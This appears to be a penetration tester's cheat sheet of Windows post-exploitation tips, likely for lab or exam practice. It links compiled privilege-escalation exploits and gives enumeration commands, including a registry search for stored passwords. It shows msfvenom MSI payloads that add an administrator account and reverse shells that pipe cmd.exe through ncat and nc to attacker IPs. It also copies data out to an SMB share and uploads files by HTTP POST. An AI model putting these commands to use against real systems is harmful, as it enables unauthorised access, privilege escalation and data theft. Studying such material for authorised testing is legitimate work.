# Windows Tips

# Compiled Exploits

Choose your potato [here](https://jlajara.gitlab.io/Potatoes_Windows_Privesc)

- [Sweet Potato](https://github.com/uknowsec/SweetPotato/blob/master/SweetPotato-Webshell-new/bin/Release/SweetPotato.exe)
- https://github.com/r3motecontrol/Ghostpack-CompiledBinaries - tools
    - https://github.com/expl0itabl3/Toolies - More compiled tools
    - https://github.com/cepxeo/redteambins.git- Compiled CVEs
- [CVE-2018-8120](https://github.com/SecWiki/windows-kernel-exploits/tree/master/CVE-2018-8120) - Windows server 2008
- SeManageVolumePrivilege https://github.com/CsEnox/SeManageVolumeExploit/releases

In addition, if you view the README in this github repo, you can see the privilege escalation paths from a wide variety of privileges.

[https://github.com/gtworek/Priv2Admin.git](https://github.com/gtworek/Priv2Admin.git)

For a comprehensive guide on manual enumeration, look here: [https://juggernaut-sec.com/manual-enumeration/](https://juggernaut-sec.com/manual-enumeration/)

# Basics

### Rename/move files

```abap
move .\TFTP.exe .\TFTP.exe.bak
```

### Make a file

```abap
fsutil file createnew filename filesize
```

### List hidden Files

```bash
dir /a C:\
```

# Enumerations

## Get Architecture of machine

```abap
echo %PROCESSOR_ARCHITECTURE%
systeminfo | findstr /I type:
wmic OS get OSArchitecture
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v PROCESSOR_ARCHITECTURE
wmic computersystem get systemtype
```

### Get Hotfixes

```bash
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

## List Tasks

```abap
tasklist /v
wmic process
powershell get-process
Get-CimInstance -ClassName Win32_Process | Sort Name | Select Name, CommandLine | Format-List
```

### List services

```bash
cmd.exe /c sc queryex state=all type=service

Get-Service | findstr -i "manual"

gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name

gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "manual"} | select PathName,DisplayName,Name
```

### Search for Passwords in Registry

```abap
reg query HKLM /f pass /t REG_SZ /s
```

### List Drives

```nasm
wmic logicaldisk get name
wmic logicaldisk # gives you all the info
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root #use powershell to list drives
```

### Check AlwaysInstallElevated Privilege

If either of these are `0x1`, you have the privilege. It might not show up in `whoami /priv`.

```jsx
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

Exploit this by creating a `*.msi` file

```jsx
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```

### Mounting an SMB Share as a Drive

You can use these 2 methods to map an smbshare as a drive in windows.

```nasm
CMD-Wind> \\10.10.14.14\path\to\exe
CMD-Wind> net use z: \\10.10.14.14\test /user:user pass #For SMB using credentials

WindPS-1> New-PSDrive -Name "new_disk" -PSProvider "FileSystem" -Root "\\10.10.14.9\kali" #optionally append "-Credential $cred" with a PS-Credential
WindPS-2> cd new_disk:

# authenticating to an SMB server before using it without having to mount it as a drive
*Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\temp> net use \\10.10.14.6\share /u:df df
The command completed successfully.
*Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\temp> copy 20191018035324_BloodHound.zip \\10.10.14.6\share\
```

To get a reverse shell this way,

```bash
#linux machine
smbserver.py SMB . -comment share -ts -debug -smb2support -username user -password 'pass'

# windows client
cmd.exe /c net use x: \\192.168.1.1\SMB /user:user pass & x:\ncat.exe 192.168.1.1 135 -e cmd.exe
```

### Find Non-Default Programs in C:\Program Files

Here is an example of a windows privesc that I found by investigating PaperStream.

*(All the files listed below are basically default besides H2 i think)* 

```abap

    Directory: C:\Program Files (x86)

Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----        4/27/2020   8:59 PM                Common Files                                                          
d-----        4/27/2020   9:01 PM                fiScanner                                                             
d-----        4/27/2020   8:59 PM                H2  #not default                                                                  
d-----        4/24/2020   9:50 AM                Internet Explorer                                                     
d-----        3/18/2019   9:52 PM                Microsoft.NET                                                         
d-----        4/27/2020   9:01 PM                PaperStream IP  #not default                                                      
d-----        3/18/2019  11:20 PM                Windows Defender                                                      
d-----        3/18/2019   9:52 PM                Windows Mail                                                          
d-----        4/24/2020   9:50 AM                Windows Media Player                                                  
d-----        3/18/2019  11:23 PM                Windows Multimedia Platform                                           
d-----        3/18/2019  10:02 PM                Windows NT                                                            
d-----        3/18/2019  11:23 PM                Windows Photo Viewer                                                  
d-----        3/18/2019  11:23 PM                Windows Portable Devices                                              
d-----        3/18/2019   9:52 PM                WindowsPowerShell
```

![Untitled](Windows%20Tips%202538ffc0176f4fbaa8e586b5ac7bcd9b/Untitled.png)

# File Uploads

Can upload files with Powershell via an HTTP Post request with `.uploadFile`

```abap
powershell (New-Object
System.Net.WebClient).UploadFile('http://10.11.0.4/upload.php', 'important.docx')
```

### Reverse shell as a different user using Runas

```bash
runas /env /profile /user:Administrator “C:\windows\temp\nc.exe -e cmd.exe 192.168.49.249 21”
```

# List/find files

Recursively list files

```abap
tree /f
dir /a-D /S /B
```

Find a file by filename

```abap
dir "Spokes.exe" /s
Get-Childitem –Path C:\ -Include local.txt -Recurse -ErrorAction SilentlyContinue #powershell command to find "local.txt"
```

# Cross-compile

C# file to `.exe`.

```abap
i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe
i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32 # links to a library

# there are other mingw32 options for different programming languages and architectures
$ apt-cache search mingw
[...]
g++-mingw-w64 - GNU C++ compiler for MinGW-w64
gcc-mingw-w64 - GNU C compiler for MinGW-w64
mingw-w64 - Development environment targeting 32- and 64-bit Windows
[...]
```

For 64-bit use:   **x86_64-w64-mingw32-g++**

For 32-bit use:   **i686-w64-mingw32-g++**

# Miscellaneous

### Possibly useful commands

You can execute an executable via powershell with the `start` command.

```jsx
powershell.exe /c start shell.exe
```

## Enable RDP

This allows you to RDP onto a host as a user even if you weren’t able to before. You will need a certain amount of permissions to do this. UACBypass might help.

![Untitled](Windows%20Tips%202538ffc0176f4fbaa8e586b5ac7bcd9b/Untitled%201.png)

[Specific Exploits (CVEs)](Windows%20Tips%202538ffc0176f4fbaa8e586b5ac7bcd9b/Specific%20Exploits%20(CVEs)%2022813384e9234d7d85d4bdb0f5b9aa84.md)

[UAC Bypass](Windows%20Tips%202538ffc0176f4fbaa8e586b5ac7bcd9b/UAC%20Bypass%20eb0ad323265b40e3b76a92b77bd308cd.md)